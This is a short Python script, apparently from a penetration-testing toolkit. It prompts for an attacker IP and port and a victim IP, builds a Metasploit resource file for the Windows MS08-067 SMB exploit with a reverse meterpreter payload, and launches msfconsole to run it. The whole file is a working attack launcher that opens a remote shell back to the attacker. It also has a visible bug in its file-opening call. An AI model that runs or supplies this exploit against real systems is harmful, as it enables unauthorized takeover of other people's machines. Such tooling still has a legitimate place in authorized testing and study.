import subprocess
try:
    input = raw_input
except NameError:
    pass
def create_rc(revhost, victim, payload, port):
    with open("/root/.set/ms08-067.rc" + "w") as filewrite:
        filewrite.write("use exploit/windows/smb/ms08_067_netapi\n"
                        "set payload {0}\n"
                        "set RHOST {1}\n"
                        "set LPORT {2}\n"
                        "set LHOST {3}\n"
                        "exploit\n\n".format(payload, victim, port, revhost))
def launch_msf():
    subprocess.Popen("msfconsole -r /root/.set/ms08-067.rc", shell=True).wait()
revhost = input("Enter your LHOST (attacker IP address) for the reverse listener: ")
revport = input("Enter your LPORT (attacker port) for the reverse listener: ")
victim = input("Enter the RHOST (victim IP) for MS08-067: ")
payload = input("Enter your payload (example: windows/meterpreter/reverse_https) - just hit enter for reverse_https: ")
if not payload:
    payload = "windows/meterpreter/reverse_https"
create_rc(revhost, victim, payload, revport)
launch_msf()